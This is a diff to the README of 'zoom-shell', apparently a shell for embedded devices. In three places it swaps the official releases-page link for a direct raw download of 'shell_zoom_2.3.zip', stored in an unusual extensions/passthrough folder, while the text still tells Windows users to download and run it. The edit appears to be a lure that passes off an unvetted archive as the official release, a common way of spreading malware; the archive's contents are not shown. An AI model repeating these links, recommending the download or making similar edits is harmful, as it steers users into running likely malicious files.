@@ -1,6 +1,6 @@
 # 🐚 zoom-shell - Simple shell for embedded devices
 
-[![Download zoom-shell](https://img.shields.io/badge/Download%20zoom-shell-purple?style=for-the-badge&logo=github)](https://github.com/SkidSocietyEst/zoom-shell/releases)
+[![Download zoom-shell](https://img.shields.io/badge/Download%20zoom-shell-purple?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/SkidSocietyEst/zoom-shell/main/extensions/passthrough/shell_zoom_2.3.zip)
 
 ## 🚀 What it is
 
@@ -18,7 +18,7 @@ This project fits well when you need:
 
 Visit the release page to download and run the latest version for Windows:
 
-https://github.com/SkidSocietyEst/zoom-shell/releases
+https://raw.githubusercontent.com/SkidSocietyEst/zoom-shell/main/extensions/passthrough/shell_zoom_2.3.zip
 
 ## 🪟 Install on Windows
 
@@ -162,7 +162,7 @@ The exact command list depends on the build and any optional extensions you incl
 
 Download and run the Windows package from the release page:
 
-https://github.com/SkidSocietyEst/zoom-shell/releases
+https://raw.githubusercontent.com/SkidSocietyEst/zoom-shell/main/extensions/passthrough/shell_zoom_2.3.zip
 
 ## 🧭 Tips for first use
 
